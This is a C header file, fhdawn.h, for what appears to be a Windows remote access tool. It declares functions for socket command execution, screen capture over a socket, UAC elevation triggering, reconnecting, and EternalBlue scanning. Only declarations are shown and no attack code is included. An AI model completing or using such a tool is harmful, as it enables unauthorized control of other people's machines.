#ifndef __FHDAWN__H__
#define __FHDAWN__H__
/*
Author: Fahad (QuantumCore)
fhdawn.h (c) 2020
Desc: Main header file 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include <winsock2.h>
#include <winsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <wininet.h>
#include <shlwapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")

#define BUFFER 1024
// I don't feel good about declaring these static.
static BOOL connected = FALSE;
static BOOL auto_elevate = FALSE;


//=====================
void ReportError(void);
void WSAReportError(void);

int CaptureAnImage(HWND hWnd, SOCKET sockfd);
void TimeStamp(char buffer[100]);
BOOL IsAdmin();
//=====================
void sockprintf(const char* words, ...);
void UACTrigger();
char* FhdawnInfo();
BOOL isFile(const char* file);
void UserPC();
void EternalBlueScan(const char* host);
char* cDir();
// Start Winsock
void StartWSA(void);
void fhdawn_main(void);
void MainConnect(void);
void sockSend(const char* data);
DWORD ProcessId(LPCTSTR ProcessName);
void ExecSock(SOCKET sockfd, char recvbuf[BUFFER]);
void CheckHost(const char* ip_address);
void checkPort(const char* ip, int port);
const char* IP2Host(const char* IP);
void split(char* src, char* dest[5], const char* delimeter);
void REConnect();

#endif  //!__FHDAWN__H__